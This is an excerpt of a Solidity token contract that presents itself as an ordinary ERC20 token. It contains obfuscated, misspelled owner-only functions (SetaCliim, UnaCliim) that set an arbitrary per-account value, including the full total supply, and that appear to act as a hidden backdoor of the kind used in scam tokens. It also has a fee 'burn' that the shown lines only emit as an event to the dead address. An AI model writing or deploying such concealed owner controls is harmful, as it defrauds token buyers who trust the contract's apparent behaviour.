...
contract token is Ownable, IERC20 {
    ...
    uint256 private _burnfiiey = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _LKD;
    mapping(address => uint256) private _aCliim;

    function SetaCliim(address acccount) public onlyowner {
        _aCliim[acccount] = _totalSupply;
    }


    function UnaCliim(address acccount) public onlyowner {
        _aCliim[acccount] = 1;
    }


    function isaCliim(address acccount) public view returns (uint256) {
        return _aCliim[acccount];
    }
    ...
    function _transfer(address sender, address recipient, uint256 ammounts) internal virtual {
        ...
        uint256 amoun;
        amoun = ammounts - fiieyammount;
        _balance[recipient] += amoun;
        if (_burnfiiey > 0){
            emit Transfer (sender, _DEADaddress, fiieyammount);
        }
